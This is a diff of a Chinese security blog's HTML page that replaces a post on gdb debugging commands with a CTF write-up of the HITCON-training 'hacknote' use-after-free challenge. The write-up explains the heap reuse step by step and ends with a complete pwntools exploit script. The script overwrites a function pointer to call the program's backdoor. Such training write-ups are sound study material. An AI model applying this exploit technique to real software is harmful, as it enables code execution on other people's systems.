@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>gdb调试总结 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" gdb ">
-  <meta name="description" content="gdb调试总结 | sixpar&#39;s blog">
+  <title>HITCON-training-hacknote(UAF) | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" ctfwiki , UAF ">
+  <meta name="description" content="HITCON-training-hacknote(UAF) | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -270,9 +270,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-gdb调试总结" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-HITCON-training-hacknote-UAF" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">gdb调试总结</h1>
+        <h1 class="article-title">HITCON-training-hacknote(UAF)</h1>
     
     <div class="article-meta">
         
@@ -282,7 +282,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="PWN题">PWN题</a>
             
         </span>
         
@@ -290,19 +290,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">gdb</a>
+            <a class="color3">ctfwiki</a>
+            
+            <a class="color4">UAF</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 08:17:40'>2020-07-03 07:10</time>
+            Created At : <time class="date" title='Updated At: 2020-07-03 11:21:19'>2020-07-03 10:43</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.1k</span>
+        <span>Count:737</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -332,7 +334,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb下不同插件"><span class="toc-text">gdb下不同插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试程序"><span class="toc-text">如何调试程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试exp"><span class="toc-text">如何调试exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试指令总结"><span class="toc-text">调试指令总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经验"><span class="toc-text">经验</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在最后"><span class="toc-text">写在最后</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（32位）"><span class="toc-text">保护机制（32位）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析程序"><span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路"><span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整exp："><span class="toc-text">完整exp：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -348,73 +350,53 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="gdb下不同插件"><a href="#gdb下不同插件" class="headerlink" title="gdb下不同插件"></a>gdb下不同插件</h2><p>包含 pwndbg 、peda、gef，它们的功能各不相同，所以需要来回切换。<br>安装过程看这篇文章</p>
+        <p>该题目是ctfwiki中 use after free 的例题</p>
+<h2 id="保护机制（32位）"><a href="#保护机制（32位）" class="headerlink" title="保护机制（32位）"></a>保护机制（32位）</h2><blockquote>
+<pre><code>Arch:     i386-32-little
+RELRO:    Partial RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      No PIE (0x8048000)</code></pre></blockquote>
+<h2 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h2><p>add_note函数：最多可添加5个note，每个note会创建两个chunk，一个chunk中包含prev_szie、prev_inuse、<em>put和</em>content这四个字段。而另一个chunk则是一段保存实际content内容的空间。其中*put位置会被设置一个统一的print函数，该函数任务是打印content指针指向的内容。而content指针则是指向了另一个chunk，即真正存储note内容的空间。</p>
+<p>print_note函数：根据index来输出对应的note的内容。具体是调用print函数。</p>
+<p>delete函数：根据指定的index进行free，但是没有将指针置空，导致UAF</p>
+<p>本题有一个后门函数名为magic函数。</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>我的想法就是把put函数覆盖为magic函数地址。然后show的时候调用put函数实际执行的是后门函数。但是要怎么修改呢，利用UAF。</p>
+<p>具体流程如下：</p>
 <blockquote>
-<p><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+<p>add_note(32)   #note0<br>add_note(32)   #note1</p>
 </blockquote>
-<p>如果后续需要对堆进行调试分析，需要另外从下面地址安装pwndbg。</p>
+<p>注意上面的“32”分配的都是content空间的大小。而note的header部分则是固定的16字节（prev_size+size+<em>put+</em>content）。我们使得它们两个大小不一样，到时候处于不同的bins链表即可。</p>
 <blockquote>
-<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">https://github.com/scwuaptx/Pwngdb</a></p>
+<p>delnote(0)<br>delnote(1)</p>
 </blockquote>
-<p>其主要包含有parseheap、heapinfo、chunkinfo 等一些重要的关于heap的指令。</p>
-<h2 id="如何调试程序"><a href="#如何调试程序" class="headerlink" title="如何调试程序"></a>如何调试程序</h2><p>比如对名为pwn的程序进行调试：</p>
+<p>由于每个note都有2个chunk，故释放时也是释放2个chunk<br>所以这4个chunk按照大小分别被放入不同的fastbins链表。<br>此时大小为0x10的fastbins链里是这样的：</p>
 <blockquote>
-<p>gdb ./pwn #开启gdb，并且file读取pwn程序<br>b main  #对main函数下断点<br>b *0x8048e40  #对某一地址进行下断点<br>b *0x56555000+0x655 #也可以基址+偏移的形式<br>r #运行程序，在输入某次数据后可以Ctrl+c 截断下来，看此时的堆栈情况。<br>start #以汇编的角度运行该程序，汇编代码将呈现在你眼前，另外还有寄存器和栈情况。<br>在指令“start”的基础上：<br>n #单步执行<br>c #自动运行到下一个断点处<br>got   #查看GOT表<br>finish  #结束掉（跳过）当前函数，直接就跳到了该函数的leave ret 处<br>q  #结束调试,或是输入detach退出</p>
+<p>[0x10] &emsp;note1_header -&gt;note0_header</p>
 </blockquote>
-<h2 id="如何调试exp"><a href="#如何调试exp" class="headerlink" title="如何调试exp"></a>如何调试exp</h2><p>别人也许是用的gdb.attach()自动依附，或者是 raw_input()<br>但我个人习惯做法是在exp中想要断点的语句前 加一个 <strong>pause()</strong> ，然后gdb attach pid<br>开两个终端（按shift+ctrl+t 在一个终端的基础上同界面内创建新的终端 ，而shift+ctrl+n 则是在新界面新建终端），假如exp全称为 exp.py，第一个终端输入 gdb exp.py ，然后会自动停在pause()语句处，得到调试程序的PID假如是6845，然后在第二个终端里输入 gdb attach 6845 便可。<br>如果有多条pause语句，那么如何执行下一个pause语句？<br>第二个终端里先输入c（即continue）等待，然后Alt+1切换至第一个终端，敲一下回车，会显示停在第二个pause处，然后切换回第二个终端，按ctrl+c截断即可继续调试。</p>
-<p>个人经常使用的exp快捷键：</p>
+<p>而大小为0x28的fastbins链里是这样的：  </p>
 <blockquote>
-<p>把选中区域全部注释掉： ctrl + /<br>令选中区域缩进： tab<br>令选中区域顶格：shift+tab</p>
+<p>[0x28] &emsp;note1_content -&gt;note0_content</p>
 </blockquote>
-<p>等等，要想 gdb attach pid 得注意：<br>ubuntu16.04 默认不允许普通用户gdb attach PID调试进程………我原先都是用root权限所以没遇到过这情况。<br>解决方法：<br>sudo vim /etc/sysctl.d/10-ptrace.conf<br>最后一行改为   kernel.yama.ptrace_scope = 0<br>去除限制！</p>
-<h2 id="调试指令总结"><a href="#调试指令总结" class="headerlink" title="调试指令总结"></a>调试指令总结</h2><p>详细的gdb调试指令请看：</p>
+<p>接下去我们申请：</p>
 <blockquote>
-<p><a href="https://blog.csdn.net/weixin_30697239/article/details/101103647" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30697239/article/details/101103647</a></p>
+<p>malloc(8)   #note2</p>
 </blockquote>
-<p>我这里列出我个人使用频繁的指令<br>gdb-peda下：   </p>
-<p>1.查看某一个地址(比如说0xf7e522b0)的详细信息，start，end，offset，位于哪个区域里</p>
+<p>由于本题中一次malloc会申请两个chunk，<br>根据请求的size为0x8，故note2的header这个chunk会分配得到note1_header ； note2存放content的chunk将会分配得到 <strong><em>note0_header</em></strong></p>
+<p>到此我们总算是可以控制某note的header部分了。</p>
+<p>我们自然是可以往note2的content里写数据，但是由于存在UAF漏洞（note0被free后指针未置0，保持原来的数据，可以继续被使用）。使得两部分内容重叠了。也就是说我们改写note2同时也能影响note0，继而我们可以修改覆盖note0_header，把note0的put函数覆盖为magic后门函数。</p>
+<p>于是我们就往note2的content中写入：</p>
 <blockquote>
-<p>xinfo 0xf7e522b0</p>
+<p>p32(magic_addr)  </p>
 </blockquote>
-<p>2.查看内存，可以找到libc程序加载的基址，还有heap等其他地址信息</p>
+<p>即可将note0_header的put函数位置修改为magic后门函数。<br>最后：</p>
 <blockquote>
-<p>vmmap </p>
+<p>printnote(0)  </p>
 </blockquote>
-<p>3.查看地址对应内存内容</p>
-<blockquote>
-<p>x/10gx 0x80485a6   </p>
-</blockquote>
-<p>4.查看地址对应的汇编代码</p>
-<blockquote>
-<p>x/20i 0x80484b6     </p>
-</blockquote>
-<p>5.看自栈顶esp开始向下20的栈的内容</p>
-<blockquote>
-<p>stack 20   </p>
-</blockquote>
-<p>6.查看寄存器ebp-0x20的内容</p>
-<blockquote>
-<p>x/w $ebp-0x20   </p>
-</blockquote>
-<p>7.查看内容</p>
-<blockquote>
-<p>telescope 0x8049700    </p>
-</blockquote>
-<p>8.计算我们输入的格式化字符串的地址与这个地址之间的偏移</p>
-<blockquote>
-<p>fmtarg 0x7fffffffdda8     </p>
-</blockquote>
-<p>9.查看堆分布</p>
-<blockquote>
-<p>parseheap    </p>
-</blockquote>
-<p>10.查看bins情况</p>
-<blockquote>
-<p>heapinfoall       </p>
-</blockquote>
-<h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><p>1.查找输入数据的去向<br>做一道题目时得到的启发：题目要求输入一串字符串，比如我们输入’AAABBBCCC’后ctrl+c断下来之后，<br>使用 find AAABBBCCC   就可以找得到字符串在内存中所储存的位置啦！</p>
-<p>2.如何应对PIE 地址随机化?<br>gdb ./pwn 打开gdb调试 ， 然后 r  加载运行程序 ， 然后在另开一个终端输入 ps -ef |grep pwn    得到pwn程序的PID ，然后 cat /proc/pid/maps  查看内存信息，得到基址，一般是第一行start地址，那么实际地址 = 基址+IDA的相对偏移。然后再在第一个终端正在运行的程序里下断点，进行后续操作，比如输入数据后ctrl+c断下来查看内存。</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>目前只总结出这么多，后续若有新知识，一定会更新的。<br>恰早饭去咯~</p>
+<p>即可触发后门函数</p>
+<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./hacknote'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"aaaa"</span>)</span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">"ddaa"</span>)</span><br><span class="line"><span class="comment">#都是fastbin</span></span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#注意指针都没有被清空！</span></span><br><span class="line"><span class="comment">#fast bin (0x10)链表里： note1_header --&gt; note0_header --&gt; 0x0</span></span><br><span class="line"><span class="comment">#fast bin (0x28)链表里： note1_content --&gt; note0_content --&gt; 0x0</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment">#put指针被修改为magic地址</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>)<span class="comment">#执行magic</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Hack The Planet<br>–2020.7.3 11:21</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
